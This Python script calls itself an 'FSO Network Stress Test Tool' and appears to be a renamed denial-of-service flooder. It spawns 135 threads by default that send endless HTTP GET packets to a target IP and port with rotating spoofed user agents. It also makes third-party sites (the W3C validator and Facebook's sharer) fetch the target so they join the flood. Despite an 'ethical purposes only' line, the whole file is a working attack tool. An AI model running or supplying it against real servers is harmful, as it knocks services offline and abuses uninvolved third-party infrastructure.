#!/usr/bin/python3
# -*- coding: utf-8 -*-

#  FSO Network Stress Test Tool v1.0

from queue import Queue
from optparse import OptionParser
import time, sys, socket, threading, logging, urllib.request, random

# Federal Agent - Single Function for User Agents
def federal_agent():
    agents = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
    ]
    return agents

# Function to define bots
def my_bots():
    global bots
    bots = []
    bots.append("http://validator.w3.org/check?uri=")
    bots.append("http://www.facebook.com/sharer/sharer.php?u=")
    return bots

def bot_testing(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(federal_agent())}))
            print("\033[94mFederal agent is testing the server...\033[0m")
            time.sleep(.1)
    except:
        time.sleep(.1)

def send_packet(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(federal_agent()) + "\n" + data).encode('utf-8')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "\033[0m \033[94m <-- packet sent! Testing continues --> \033[0m")
            else:
                s.shutdown(1)
                print("\033[91mShutdown\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mConnection error! The server might be down\033[0m")
        time.sleep(.1)

def stress_test():
    while True:
        item = q.get()
        send_packet(item)
        q.task_done()

def bot_test():
    while True:
        item = w.get()
        bot_testing(random.choice(bots) + "http://" + host)
        w.task_done()

def usage():
    print(''' \033[92m
    FSO Network Stress Test Tool v1.0
    For ethical purposes only. This tool is designed to test network resilience.
    Always ensure you have permission to perform stress tests.
    
    Usage: python3 fso_tool.py [-s] [-p] [-t]
    -h : help
    -s : server IP
    -p : port (default 80)
    -t : threads (default 135) \033[0m''')
    sys.exit()

def get_parameters():
    global host, port, thr
    optp = OptionParser(add_help_option=False, epilog="FSO Stress Test Tool")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="target server IP -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="Port -p (default 80)")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="Threads -t (default 135)")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help menu")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s %(message)s')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

# Reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

# Call the bot definition function here
my_bots()

# Task queues
q = Queue()
w = Queue()

if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()
    print("\033[92m", host, " port: ", str(port), " threads: ", str(thr), "\033[0m")
    print("\033[94mPreparing for the test...\033[0m")
    time.sleep(5)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.settimeout(1)
    except socket.error as e:
        print("\033[91mCheck server IP and port\033[0m")
        usage()

    while True:
        for i in range(int(thr)):
            t = threading.Thread(target=stress_test)
            t.daemon = True
            t.start()
            t2 = threading.Thread(target=bot_test)
            t2.daemon = True
            t2.start()
        start = time.time()
        # Tasking loop
        item = 0
        while True:
            if item > 1800:
                item = 0
                time.sleep(.1)
            item += 1
            q.put(item)
            w.put(item)
        q.join()
        w.join()
